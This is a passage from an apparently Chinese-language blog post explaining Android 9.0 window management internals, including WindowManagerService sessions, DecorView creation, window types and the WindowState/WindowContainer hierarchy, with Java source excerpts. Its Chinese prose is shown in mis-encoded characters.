<li><code>attach()</code>æ–¹æ³•ä¹Ÿåªæ˜¯è°ƒç”¨äº†<code>mSession</code>å¯¹è±¡çš„<code>windowAddedLocked()</code>æ–¹æ³•</li>
</ul>
<p>ç»§ç»­çœ‹ä¸‹<code>windowAddedLocked()</code>æ–¹æ³•:</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">void</span> <span class="hljs-title function_">windowAddedLocked</span><span class="hljs-params">(String packageName)</span> {
        mPackageName = packageName;
        mRelayoutTag = <span class="hljs-string">"relayoutWindow: "</span> + mPackageName;
        <span class="hljs-keyword">if</span> (mSurfaceSession == <span class="hljs-literal">null</span>) {
            mSurfaceSession = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SurfaceSession</span>();
            mService.mSessions.add(<span class="hljs-built_in">this</span>);
            <span class="hljs-keyword">if</span> (mLastReportedAnimatorScale != mService.getCurrentAnimatorScale()) {
                mService.dispatchNewAnimatorScaleLocked(<span class="hljs-built_in">this</span>);
            }
        }
        mNumWindow++;
    }
</code></pre>
<p><code>windowAddedLocked()</code>æ–¹æ³•</p>
<ul>
<li>é¦–å…ˆæ£€æŸ¥äº†<code>mSurfaceSession</code>çš„å€¼ï¼Œå½“ä¸ºç©ºæ—¶æ‰ä¼šåˆ›å»º<code>SurfaceSession</code>å¯¹è±¡
<ul>
<li>å‰é¢<a href="https://juejin.cn/post/6944960866404007944#heading-7" target="_blank" title="https://juejin.cn/post/6944960866404007944#heading-7">å›¾åƒæ˜¾ç¤º</a>éƒ¨åˆ†ä»‹ç»è¿‡ï¼Œ<code>SurfaceSession</code>å¯¹è±¡æ˜¯ç”¨æ¥åˆ›å»º<code>Surface</code>çš„</li>
</ul>
</li>
<li>ç„¶åå°†<code>Session</code>å¯¹è±¡æœ¬èº«æ·»åŠ åˆ°<code>WMS</code>çš„<code>mSessions</code>åˆ—è¡¨ä¸­</li>
</ul>
<p>åˆ°è¿™é‡Œï¼Œåº”ç”¨è¿›ç¨‹å°±å’Œ<code>WMS</code>å„è‡ªæŒæœ‰äº†å¯¹æ–¹çš„<code>Binder</code>å¼•ç”¨å¯¹è±¡ï¼Œå½¢æˆäº†ä¸€ä¸ªåŒå‘<code>Binder</code>é€šé“ï¼Œç¤ºæ„å›¾å¦‚ä¸‹ï¼š<br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c770d89efe34906bf922df504d858aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXBpZ2ZseQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764508564&amp;x-signature=NaEwJ3G6o3LRkFsTlJKCfHjPwjA%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-9">DecorView</h3>
<p>å…³äº<code>DecorView</code>ï¼Œè¿˜æ˜¯è¦ä»æˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„åœ°æ–¹è¯´èµ·ã€‚</p>
<p>åœ¨<code>Activity</code>çš„<code>onCreate()</code>ä¸­è°ƒç”¨<code>setContentView()</code>æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬çœ‹ä¸‹å‘ç”Ÿäº†ä»€ä¹ˆï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContentView</span><span class="hljs-params">(<span class="hljs-meta">@LayoutRes</span> <span class="hljs-type">int</span> layoutResID)</span> {
        getWindow().setContentView(layoutResID);
        initWindowDecorActionBar();
    }
</code></pre>
<p><code>Activity</code>çš„<code>onCreate()</code>è°ƒç”¨çš„æ˜¯<code>Window</code>ç±»çš„<code>setContentView()</code>ï¼Œè¿™æ˜¯ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œå…·ä½“çš„å®ç°åœ¨<code>PhoneWindow.java</code>ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContentView</span><span class="hljs-params">(View view, ViewGroup.LayoutParams params)</span> {
        <span class="hljs-keyword">if</span> (mContentParent == <span class="hljs-literal">null</span>) {
            installDecor();
        }
        ...
    }
</code></pre>
<p>å¦‚æœ<code>mContentParent</code>å¯¹è±¡è¿˜æ²¡æœ‰åˆ›å»ºå‡ºæ¥ï¼Œåˆ™ä¼šè°ƒç”¨<code>installDecor()</code>æ–¹æ³•ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">installDecor</span><span class="hljs-params">()</span> {
        mForceDecorInstall = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">if</span> (mDecor == <span class="hljs-literal">null</span>) {
            mDecor = generateDecor(-<span class="hljs-number">1</span>); <span class="hljs-comment">// åˆ›å»º DecorView</span>
            mDecor.setDescendantFocusability(ViewGroup.FOCUS_AFTER_DESCENDANTS);
            mDecor.setIsRootNamespace(<span class="hljs-literal">true</span>);
            <span class="hljs-keyword">if</span> (!mInvalidatePanelMenuPosted &amp;&amp; mInvalidatePanelMenuFeatures != <span class="hljs-number">0</span>) {
                mDecor.postOnAnimation(mInvalidatePanelMenuRunnable);
            }
        } <span class="hljs-keyword">else</span> {
            mDecor.setWindow(<span class="hljs-built_in">this</span>);
        }
        <span class="hljs-keyword">if</span> (mContentParent == <span class="hljs-literal">null</span>) {
            mContentParent = generateLayout(mDecor); <span class="hljs-comment">// ä¸ºDecorViewè®¾ç½®å¸ƒå±€æ ¼å¼ï¼Œå¹¶è¿”å› mContentParent</span>
        }
    }
</code></pre>
<p><code>installDecor()</code>æ–¹æ³•</p>
<ul>
<li>
<p>å…ˆæ ¹æ®æˆå‘˜å˜é‡<code>mDecor</code>æ˜¯å¦ä¸ºç©ºæ¥å†³å®šæ˜¯å¦è¿›è¡Œ<code>DecorView</code>çš„åˆ›å»º</p>
<ul>
<li>å¯¹è±¡çš„åˆ›å»ºæ–¹æ³•ä¸º<code>generateDecor()</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> DecorView <span class="hljs-title function_">generateDecor</span><span class="hljs-params">(<span class="hljs-type">int</span> featureId)</span> {
    Context context;
    ... <span class="hljs-comment">// çœç•¥ context çš„åˆ›å»ºè¿‡ç¨‹</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecorView</span>(context, featureId, <span class="hljs-built_in">this</span>, getAttributes());
}
</code></pre>
</li>
<li>
<p>ç„¶åé€šè¿‡<code>generateLayout()</code>æ–¹æ³•ä¸ºåˆ›å»ºå¥½çš„<code>DecorView</code>è®¾ç½®å¸ƒå±€æ ¼å¼ï¼Œå¹¶è¿”å›<code>mContentParent</code>å¯¹è±¡</p>
</li>
</ul>
<p>æˆ‘ä»¬å†çœ‹ä¸‹<code>DecorView</code>çš„å®šä¹‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/** <span class="hljs-doctag">@hide</span> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecorView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameLayout</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RootViewSurfaceTaker</span>, WindowCallbacks {
    ...
}
</code></pre>
<p>å…¶å®å°±æ˜¯ä¸ªè‡ªå®šä¹‰çš„<code>ViewGroup</code>ï¼Œåªæ˜¯è¿™ä¸ª<code>DecorView</code>åœ¨<code>Android</code>ä¸­ä½œä¸ºé¡¶çº§<code>View</code>å»ä½¿ç”¨</p>
<h2 data-id="heading-10"><code>WindowManagerService</code>æœåŠ¡</h2>
<p><code>WMS</code>æœåŠ¡çš„å¯åŠ¨ï¼Œè¦ä»<code>SystemServer</code>ä¸­çš„<code>startOtherServices()</code>æ–¹æ³•è¯´èµ·ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startOtherServices</span><span class="hljs-params">()</span> {
    ...
    wm = WindowManagerService.main(..., <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhoneWindowManager</span>());
    ServiceManager.addService(Context.WINDOW_SERVICE, wm, <span class="hljs-comment">/* allowIsolated= */</span> <span class="hljs-literal">false</span>,
            DUMP_FLAG_PRIORITY_CRITICAL | DUMP_FLAG_PROTO);
    ...
}
</code></pre>
<p>çœ‹ä¸‹<code>main()</code>æ–¹æ³•çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> WindowManagerService <span class="hljs-title function_">main</span><span class="hljs-params">(..., WindowManagerPolicy policy)</span> {
        DisplayThread.getHandler().runWithScissors(() -&gt;
                sInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowManagerService</span>(context, im, haveInputMethods, showBootMsgs,
                        onlyCore, policy), <span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> sInstance;
    }
</code></pre>
<p><code>main()</code>æ–¹æ³•ä¸»è¦æ˜¯åˆå§‹åŒ–äº†<code>WindowManagerService</code>å¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯å®ƒçš„æœ€åçš„å‚æ•°<code>WindowManagerPolicy policy</code>ï¼Œå®ƒçš„å…·ä½“çš„å®ç°ç±»æ˜¯<code>PhoneWindowManager</code></p>
<p>å†çœ‹ä¸‹<code>WindowManagerService</code>çš„å…³é”®å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IWindowManager</span>.Stub
        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watchdog</span>.Monitor, WindowManagerPolicy.WindowManagerFuncs {
    ...
    <span class="hljs-keyword">final</span> ArraySet&lt;Session&gt; mSessions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>&lt;&gt;();
    <span class="hljs-keyword">final</span> <span class="hljs-type">WindowHashMap</span> <span class="hljs-variable">mWindowMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowHashMap</span>();
    <span class="hljs-keyword">final</span> WindowManagerPolicy mPolicy;
    ...
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">WindowManagerService</span><span class="hljs-params">(..., WindowManagerPolicy policy)</span> {
        ...
        mPolicy = policy;
        ...
    }
}
</code></pre>
<p>å…¶ä¸­çš„å…³é”®æˆå‘˜å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><code>mSessions</code>ä¸­å‚¨å­˜çš„æ˜¯<code>Session</code>æœåŠ¡ç±»çš„å¯¹è±¡ï¼Œæ¯ä¸ªåº”ç”¨åœ¨<code>WMS</code>ä¸­éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„<code>Session</code>å¯¹è±¡ï¼Œå®ƒä»¬éƒ½ä¿å­˜åœ¨<code>mSessions</code>ä¸­</p>
</li>
<li>
<p><code>mWindowMap</code>ä¸­ç±»å‹æ˜¯<code>WindowHashMap</code>ï¼Œä¿å­˜çš„æ˜¯æ‰€æœ‰çª—å£çš„<code>WindowState</code>å¯¹è±¡ã€‚<code>WindowHashMap</code>å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowHashMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span>&lt;IBinder, WindowState&gt; {
}
</code></pre>
<ul>
<li>æ­¤å¤„å¹¶æœªåšä»»ä½•åˆ å‡å“ˆï¼Œæºç ä¸­å°±æ˜¯ç®€å•åœ°ç»§æ‰¿äº†<code>HashMap&lt;IBinder, WindowState&gt;</code></li>
<li><code>WindowState</code>è¡¨ç¤ºä¸€ä¸ªçª—å£çš„æ‰€æœ‰å±æ€§ï¼Œå®ƒä¾¿æ˜¯æ˜¯<code>WMS</code>ä¸­çš„çª—å£ã€‚ç­‰ä¸‹ç»†è®²</li>
</ul>
</li>
<li>
<p><code>mPolicy</code>æ˜¯<code>WMS</code>ä¸­æ‰§è¡Œçª—å£ç®¡ç†ç­–ç•¥çš„å¯¹è±¡ï¼Œç±»å‹æ˜¯<code>WindowManagerPolicy</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¥å£ç±»</p>
<ul>
<li>ä»<code>SystemServer</code>çš„<code>startOtherServices()</code>ä¸­å¯ä»¥çœ‹å‡ºå…·ä½“çš„å®ç°ç±»æ˜¯<code>PhoneWindowManager</code></li>
<li>åœ¨<code>Android</code>ä¸­<code>WMS</code>åªæ˜¯è´Ÿè´£çª—å£ç®¡ç†çš„æ¡†æ¶éƒ¨åˆ†ï¼Œé€šè¿‡<code>ç­–ç•¥æ¨¡å¼</code>å°†æ¡†æ¶å’Œçª—å£å®ç°ç»†èŠ‚è¿›è¡Œäº†åˆ†ç¦»</li>
</ul>
</li>
</ul>
<p>å¯¹æ¯”<code>9.0</code>å’Œ<code>5.0</code>æºç ï¼Œ<code>WMS</code>å…³äºçª—å£éƒ¨åˆ†è®¾è®¡å˜åŒ–å¾ˆå¤§ï¼Œåœ¨äº†è§£<code>Android</code>å¦‚ä½•æ·»åŠ ä¸€ä¸ªçª—å£å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸‹<code>Android</code>ä¸­çª—å£ç±»å‹çš„å®šä¹‰</p>
<h3 data-id="heading-11">çª—å£ç±»å‹</h3>
<p>åœ¨<code>WMS</code>ä¸­å®šä¹‰äº†3ä¸­çª—å£ï¼š<code>åº”ç”¨çª—å£</code>ã€<code>å­çª—å£</code>å’Œ<code>ç³»ç»Ÿçª—å£</code>ï¼Œç›¸å…³çš„å®šä¹‰éƒ½æ˜¯åœ¨<code>frameworks/base/core/java/android/view/WindowManager.java</code>ä¸­ï¼Œç¡®åˆ‡çš„è¯´åº”è¯¥æ˜¯åœ¨<code>WindowManager.LayoutParams</code>ç±»ä¸­å®šä¹‰</p>
<h4 data-id="heading-12">åº”ç”¨çª—å£(<code>application window</code>)</h4>
<p>åº”ç”¨çª—å£æ˜¯<code>Activity</code>ä½¿ç”¨çš„å…¨å±çª—å£ï¼Œ<code>Android</code>å®šä¹‰äº†4ç§ä¸åŒç±»å‹çš„åº”ç”¨çª—å£</p>
<ul>
<li><code>TYPE_BASE_APPLICATION</code>ï¼šåŸºç¡€åº”ç”¨çª—å£ï¼Œåº”ç”¨ä¸­æ‰€æœ‰çª—å£éƒ½ä½äºå®ƒçš„ä¸Šå±‚ã€‚åªèƒ½ç”±ç³»ç»Ÿåˆ›å»º</li>
<li><code>TYPE_APPLICATION</code>ï¼š<code>Activity</code>çš„é¡¶å±‚çª—å£ï¼Œåº”ç”¨ä¸­æœ€å¸¸è§çš„ä¸€ç§</li>
<li><code>TYPE_APPLICATION_STARTING</code>ï¼šåº”ç”¨å¯åŠ¨æ—¶ç”±ç³»ç»Ÿåˆ›å»ºçš„çª—å£ï¼Œæ˜¾ç¤ºä¸€äº›ä¿¡æ¯ï¼Œç›´åˆ°åº”ç”¨åˆ›å»ºçš„çª—å£æ˜¾ç¤ºå‡ºæ¥</li>
<li><code>TYPE_DRAWN_APPLICATION</code>ï¼šç±»ä¼¼äºæ™®é€šçš„<code>TYPE_APPLICATION</code>ï¼Œ<code>WMS</code>é’ˆå¯¹ç±»å‹é¢å¤–å¢åŠ äº†ç­‰å¾…æœºåˆ¶</li>
</ul>
<h4 data-id="heading-13">å­çª—å£(<code>sub-window</code>)</h4>
<p>å­çª—å£æ˜¯æŒ‡ä¾é™„äºåº”ç”¨çª—å£æˆ–ç³»ç»Ÿçª—å£çš„çª—å£ç±»å‹ï¼Œå®ƒä»¬ä¸€èˆ¬éšæ‰€ä¾é™„çš„çª—å£ä¸€èµ·å‡ºç°æˆ–åˆ‡æ¢åˆ°åå°ã€‚<code>Android</code>ä¸­å®šä¹‰äº†6ç§å­çª—å£ç±»å‹</p>
<ul>
<li><code>TYPE_APPLICATION_PANEL</code>ï¼šåº”ç”¨Panelçª—å£ï¼Œæ˜¾ç¤ºåœ¨ä¾é™„çª—å£çš„ä¸Šå±‚</li>
<li><code>TYPE_APPLICATION_MEDIA</code>ï¼šåº”ç”¨Mediaçª—å£ï¼Œé€šå¸¸åŒ…å«ç‹¬ç«‹çš„Surfaceï¼Œæ˜¾ç¤ºåœ¨ä¾é™„çª—å£çš„ä¸‹å±‚</li>
<li><code>TYPE_APPLICATION_SUB_PANEL</code>ï¼šåº”ç”¨å­Panelçª—å£ï¼Œæ˜¾ç¤ºåœ¨ä¾é™„çª—å£å’Œ<code>TYPE_APPLICATION_PANEL</code>çš„ä¸Šå±‚</li>
<li><code>TYPE_APPLICATION_ATTACHED_DIALOG</code>ï¼šå’Œ<code>TYPE_APPLICATION_PANEL</code>ç±»ä¼¼ï¼Œä½†æ˜¯çª—å£çš„å¸ƒå±€æ–¹å¼å’Œ<code>Activity</code>çš„é¡¶å±‚çª—å£ç›¸åŒ</li>
<li><code>TYPE_APPLICATION_MEDIA_OVERLAY</code>ï¼šä¸€ç§æ˜¾ç¤ºåœ¨<code>TYPE_APPLICATION_MEDIA</code>å’Œæ‰€ä¾é™„çª—å£ä¹‹é—´çš„åŠé€æ˜çª—å£ã€‚ä¸€èˆ¬ç”¨æ¥æ˜¾ç¤º<code>Video</code>çš„å­—å¹•æˆ–è€…ç›¸æœºçš„æ“ä½œæç¤ºç•Œé¢</li>
<li><code>TYPE_APPLICATION_ABOVE_SUB_PANEL</code>ï¼šä¸€ç§æ˜¾ç¤ºåœ¨<code>TYPE_APPLICATION_SUB_PANEL</code>ä¹‹ä¸Šçš„çª—å£</li>
</ul>
<h4 data-id="heading-14">ç³»ç»Ÿçª—å£(<code>system window</code>)</h4>
<p>ç³»ç»Ÿçª—å£å¤§éƒ½ç”¨äºç³»ç»Ÿç”Ÿæˆçš„UIä¸­ï¼Œä¸€èˆ¬æ¯”è¾ƒç‹¬ç«‹ï¼Œç§ç±»éå¸¸å¤šï¼Œæˆ‘ä»¬æŒ‘å‡ ä¸ªå¸¸è§çš„çœ‹ä¸‹</p>
<ul>
<li><code>TYPE_STATUS_BAR</code>ï¼šçŠ¶æ€æ çª—å£ï¼Œç³»ç»Ÿä¸­åªèƒ½æœ‰ä¸€ä¸ªï¼Œåœ¨å±å¹•çš„æœ€ä¸Šæ–¹</li>
<li><code>TYPE_SEARCH_BAR</code>ï¼šæœç´¢æ çª—å£ï¼Œç³»ç»Ÿä¸­åªèƒ½æœ‰ä¸€ä¸ªï¼Œåœ¨å±å¹•çš„æœ€ä¸Šæ–¹</li>
<li><code>TYPE_PHONE</code>ï¼šç”µè¯çª—å£ï¼Œæä¾›ç”¨æˆ·ä¸ç”µè¯çš„äº¤äº’ç•Œé¢ï¼Œé€šå¸¸ä½äºæ‰€ç”¨åº”ç”¨çª—å£çš„ä¸Šæ–¹ï¼Œä½†æ˜¯åœ¨çŠ¶æ€æ çš„åé¢</li>
<li><code>TYPE_SYSTEM_ALERT</code>ï¼šç³»ç»Ÿè­¦å‘Šçª—å£ï¼Œä½äºæ‰€ç”¨åº”ç”¨çª—å£çš„ä¸Šæ–¹</li>
<li><code>TYPE_TOAST</code>ï¼šä¸´æ—¶é€šçŸ¥çª—å£ï¼Œæ˜¾ç¤ºä¸€äº›æç¤ºä¿¡æ¯</li>
</ul>
<p>è¿˜æœ‰å¾ˆå¤šå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œ<code>Android</code>å¯¹<code>ç³»ç»Ÿçª—å£</code>çš„å®šä¹‰æœ‰39ç§ä¹‹å¤šï¼Œæºç ä¸­æœ‰ç€è¯¦ç»†çš„æ³¨é‡Šï¼Œå¤§å®¶å¯ä»¥åœ¨<code>WindowManager.java</code>ä¸­æ‰¾åˆ°(<a href="https://link.juejin.cn?target=http%3A%2F%2Fandroidxref.com%2F9.0.0_r3%2Fxref%2Fframeworks%2Fbase%2Fcore%2Fjava%2Fandroid%2Fview%2FWindowManager.java%23697" target="_blank" title="http://androidxref.com/9.0.0_r3/xref/frameworks/base/core/java/android/view/WindowManager.java#697" ref="nofollow noopener noreferrer">ä¼ é€é—¨</a>)</p>
<p><strong>é‚£ä¹ˆ<code>WMS</code>ä¸­æ˜¯æ€ä¹ˆå®šä¹‰çª—å£çš„å‘¢ï¼Ÿ</strong></p>
<h3 data-id="heading-15"><code>WMS</code>ä¸­çª—å£çš„è®¾è®¡</h3>
<blockquote>
<p>å‰é¢è®²è¿‡ï¼ˆ<code>WMS</code>çš„<code>addWindow()</code>æ–¹æ³•ï¼‰ï¼Œå½“å‘<code>WMS</code>æ·»åŠ ä¸€ä¸ªçª—å£æ—¶ï¼Œ<code>WMS</code>ä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ª<code>WindowState</code>ã€‚å¯¹äº<code>WindowState</code>æ¥è¯´ï¼Œå®ƒåŒ…å«äº†ä¸€ä¸ªçª—å£çš„æ‰€æœ‰å±æ€§ï¼Œæ‰€ä»¥å®ƒæ˜¯<code>WMS</code>ä¸­çœŸæ­£æ„ä¹‰ä¸Šçš„çª—å£</p>
</blockquote>
<p>å…ˆçœ‹ä¸‹<code>WindowState</code>çš„å…³é”®å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/** A window in the window manager. */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WindowContainer</span>&lt;WindowState&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WindowManagerPolicy</span>.WindowState {
    ...
    WindowToken mToken;
    AppWindowToken mAppToken;
    ...
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> mBaseLayer;
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> mSubLayer;
}
</code></pre>
<p><code>WindowState</code>ç»§æ‰¿äº†<code>WindowContainer</code>ï¼Œåˆæ˜¯å’Œä¹¦ä¸­ä¸ä¸€æ ·çš„åœ°æ–¹</p>
<blockquote>
<p>å¯¹æ¯”5.0æºç ï¼Œå¾ˆæ˜æ˜¾åœ¨<code>Window</code>è¿™éƒ¨åˆ†<code>Android</code>åšäº†é‡æ„ï¼ˆè®¾è®¡æ¨¡å¼çœ‹ä¸Šå»åƒæ˜¯<code>ç»„åˆæ¨¡å¼</code>ï¼‰ï¼Œä¼˜åŒ–äº†ç±»ç»“æ„ï¼ŒæŠ½è±¡å‡ºäº†<code>WindowContainer</code>ç”¨æ¥æ”¯æ’‘èµ·æ•´ä¸ªçª—å£ä½“ç³»</p>
</blockquote>
<p>åŸºäº<code>Android 9.0</code>æºç ï¼Œçª—å£ä½“ç³»çš„å…³ç³»æ¢³ç†å¦‚ä¸‹ï¼š<br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2dcd21f21c44ce48b16279606ba5d73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXBpZ2ZseQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764508564&amp;x-signature=ESLkSCnWfFCwab6KKqZzZ5yiLvY%3D" alt="image" loading="lazy"/></p>
<p>ç±»å›¾ä¸­æ¶‰åŠåˆ°çš„ç±»çš„ä¿¡æ¯ä¸‹ï¼š</p>
<ul>
<li>
<p><code>WindowContainer</code></p>
<ul>
<li>æˆå‘˜å˜é‡<code>mChildren</code>çš„ç±»å‹æ˜¯<code>WindowList</code>ï¼Œçœ‹å®ç°å…¶å®å°±æ˜¯<code>ArrayList&lt;WindowState&gt;</code>ã€‚åˆå› ä¸º<code>WindowToken</code>ç»§æ‰¿äº†<code>WindowContainer</code>ï¼Œæ‰€ä»¥è¯¥æˆå‘˜å˜é‡å­ç±»éƒ½ä¼šç»§æ‰¿è¿‡æ¥</li>
<li>æ‰€æœ‰æ‹¥æœ‰ç›¸åŒ<code>Token</code>çš„çª—å£(<code>WindowState</code>)éƒ½ä¼šå­˜æ”¾åœ¨<code>mChildren</code>ä¸­ï¼Œ</li>
</ul>
</li>
<li>
<p><code>WindowToken</code></p>
<ul>
<li>æˆå‘˜å˜é‡<code>token</code>æ˜¯<code>IBinder</code>å¯¹è±¡ï¼Œå…·æœ‰ç³»ç»Ÿå”¯ä¸€æ€§ï¼Œå‘<code>WMS</code>çš„<code>mWindowMap</code>ä¸­æ·»åŠ å¯¹è±¡æ—¶éƒ½æ˜¯ä½¿ç”¨è¿™ä¸ª<code>token</code>å€¼</li>
<li>å®šä¹‰äº†<code>AppWindowToken asAppWindowToken()</code>ï¼Œé»˜è®¤è¿”å›<code>null</code></li>
</ul>
</li>
<li>
<p><code>AppWindowToken</code></p>
<ul>
<li>ç»§æ‰¿è‡ª<code>WindowToken</code>å¹¶é‡å†™äº†<code>AppWindowToken asAppWindowToken()</code>æ–¹æ³•ï¼Œè¿”å›<code>this</code></li>
<li>è¿™æ ·ä¾¿å¯ä»¥é€šè¿‡<code>asAppWindowToken()</code>çš„è¿”å›å€¼åˆ¤æ–­æ˜¯é‚£ç§<code>Token</code></li>
</ul>
</li>
<li>
<p><code>DisplayContent</code></p>
<ul>
<li>ç»§æ‰¿è‡ª<code>WindowContainer</code>ï¼ŒçœŸæ­£æ„ä¹‰ä¸Šçš„å±å¹•ï¼Œ<code>WMS</code>ä¸­ä¸€ä¸ª<code>DisplayContent</code>å®ä¾‹è¡¨ç¤ºä¸€ä¸ªå±å¹•ã€‚å¤šå±å¹•ä¼šå¯¹åº”å¤šä¸ªå®ä¾‹</li>
<li>å†…éƒ¨å®šä¹‰äº†4ç§å­˜æ”¾<code>Window</code>çš„å®¹å™¨ï¼Œéƒ½æ˜¯ç›´æ¥æˆ–é—´æ¥ç»§æ‰¿è‡ª<code>WindowContainer</code>ï¼š
<ul>
<li><code>mTaskStackContainers</code>ï¼šç”¨æ¥ä¿å­˜æ‰€æœ‰çš„åº”ç”¨çª—å£</li>
<li><code>mAboveAppWindowsContainers</code>ï¼šç”¨æ¥ä¿å­˜æ˜¾ç¤ºåœ¨åº”ç”¨çª—å£çš„ä¸Šé¢çš„éåº”ç”¨çª—å£</li>
<li><code>mBelowAppWindowsContainers</code>ï¼šç”¨æ¥ä¿å­˜æ˜¾ç¤ºåœ¨åº”ç”¨çª—å£çš„ä¸‹é¢çš„éåº”ç”¨çª—å£</li>
<li><code>mImeWindowsContainers</code>ï¼šç”¨æ¥ä¿å­˜ IME Window</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>RootWindowContainer</code></p>
<ul>
<li>ä»£è¡¨<code>WMS</code>ä¸­çª—å£çš„æ ¹å®¹å™¨ï¼Œæ‰€æœ‰<code>DisplayContent</code>çš„å®ä¾‹éƒ½ä¼šæ·»åŠ åˆ°å…¶ä¸­</li>
<li><code>RootWindowContainer</code>åœ¨<code>WMS</code>çš„æ„é€ æ–¹æ³•ä¸­åˆå§‹åŒ–ä¸º<code>mRoot</code>å¯¹è±¡</li>
</ul>
</li>
</ul>
<p>è¿˜æ˜¯å›åˆ°<code>WindowState</code>ï¼Œç±»ä¸­å®šä¹‰äº†ä¸¤ä¸ªå¸¸é‡<code>mBaseLayer</code>å’Œ<code>mSubLayer</code>ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªå¸¸é‡ä¾¿å¯ä»¥ç¡®å®šä¸€ä¸ª<code>Window</code>æ‰€åœ¨çš„å±‚çº§ã€‚è¿™éƒ¨åˆ†å°±ä¸ç»†è®²äº†å“ˆï¼Œæ¶‰åŠç‚¹æœ‰ç‚¹å¤šï¼Œåé¢ç”¨åˆ°å†æ¥è¡¥å……å§ï¼Œå˜»å˜»</p>
<p>æˆ‘ä»¬é‡ç‚¹çœ‹ä¸‹é¢ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š<code>WMS</code>çš„<code>addWindow</code>å’Œ<code>relayoutWindow</code>çš„è®¾è®¡</p>
<h4 data-id="heading-16">addWindowæ–¹æ³•</h4>
<p><code>addWindow()</code>åœ¨<a href="#WMS2APP" title="#WMS2APP">WMSä¸­å»ºç«‹å’Œåº”ç”¨çš„å…³ç³»</a>å·²ç»ä»‹ç»ï¼Œä¸å†èµ˜è¿°</p>
<h4 data-id="heading-17">relayoutWindowæ–¹æ³•</h4>
<p>å‰é¢ä»‹ç»è¿‡ï¼Œåœ¨<code>Activity</code>çš„<code>onResume</code>é˜¶æ®µï¼Œé€šè¿‡<code>ViewRootImpl</code>çš„<code>setView</code>æ–¹æ³•å¼€å§‹æ¸²æŸ“<code>View</code>çš„æµç¨‹ã€‚</p>
<p><code>setView</code>æ–¹æ³•ä¸­ä¼šé€šè¿‡<code>requestLayout()</code>å¼€å§‹æµ‹é‡æ¸²æŸ“ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­æœ‰ä¸€ä¸ªæ ¸å¿ƒçš„é€»è¾‘å°±æ˜¯è°ƒç”¨<code>WMS</code>çš„<code>relayoutWindow()</code>ï¼Œé‡æ–°æµ‹é‡<code>Window</code>ï¼Œç®€è¦æµç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//ViewRootImpl.java</span>
